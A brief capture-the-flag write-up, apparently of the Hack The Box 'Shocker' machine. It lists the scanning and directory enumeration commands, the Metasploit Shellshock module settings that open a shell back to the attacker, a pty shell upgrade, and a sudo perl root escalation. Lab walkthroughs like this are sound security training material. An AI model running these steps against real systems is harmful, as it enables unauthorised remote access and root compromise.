
29 JUL 2021

![image](https://user-images.githubusercontent.com/67979878/127450744-30c409b9-1de0-41c9-b056-deb197644ff8.png)

SCANNING
=========

intial scanning
---------------
$nmap -sV -v -sC 10.10.10.56 -oN nmap/intial

````
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu

````


ENUMERATION
===========
hence challenge name is shocker i tried /cgi-bin/ 
and it exists but forbidden .

$ gobuster dir -u "http://10.10.10.56/cgi-bin/" -w=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,sh| tee gobuster.txt


#user.sh


EXPLOITATION
=============
shellshock exploit .

$msfconsle

use :

multi/http/apache_mod_cgi_bash_env_exec


set targeturi /cgi-bin/user.sh

set rhost target

set lhost tun0

now we have a meterpreter shell :

meterpreter > shell

for a better shell :) 

`$python3 -c "import pty;pty.spawn('/bin/bash')"`


PRIVELEGE ESCALTION
===================

$sudo -l 

we can see shelly can run perl as root  .


https://gtfobins.github.io/gtfobins/perl/#sudo


`$sudo perl -e 'exec "/bin/sh";' `


#pwned.

